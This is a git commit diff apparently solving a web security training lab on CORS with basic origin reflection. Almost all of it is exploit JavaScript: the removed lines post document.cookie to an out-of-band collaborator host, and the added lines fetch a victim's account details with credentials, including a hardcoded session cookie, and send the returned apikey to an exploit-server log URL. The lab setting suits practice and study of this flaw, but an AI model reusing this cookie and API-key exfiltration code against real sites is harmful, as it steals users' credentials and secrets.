8ca1d1e22fb003998efa53fe8c7d495b0860936a
Mahmood Ahmad <mehmood4129@gmail.com>
2025-09-12 15:55:04 +0500

    LAB: CORS vulnerability with basic origin reflection

--- index.js
+++ index.js
@@ -1,7 +1,31 @@
 fetch(
-    "https://8v4rlzwp2q0o0voochm2jwuap1vsji77.oastify.com",
-    {method: "POST",
-        body: document.cookie,
-        mode: "no-cors"
-    }
+  "https://0a9200f4033ffc19804512d000440093.web-security-academy.net/accountDetails",
+  {
+    method: "GET",
+    headers: {
+      Cookie: "session=Le0vQyPsa19ZphE7AjpwpSmLqT7bMSXD;",
+    },
+  }
 )
+  .then((response) => response.json())
+  .then((data) => {
+    fetch(
+      `https://exploit-0a58000003aafcc7808e11cb015b005b.exploit-server.net/log?key=${data.apikey}`
+    );
+    console.log(data.apikey);
+  });
+
+fetch(
+  "https://0a9200f4033ffc19804512d000440093.web-security-academy.net/accountDetails",
+  {
+    method: "GET",
+    credentials: "include",
+  }
+)
+  .then((response) => response.json())
+  .then((data) => {
+    fetch(
+      `https://exploit-0a58000003aafcc7808e11cb015b005b.exploit-server.net/log?key=${data.apikey}`
+    );
+  });
+  //
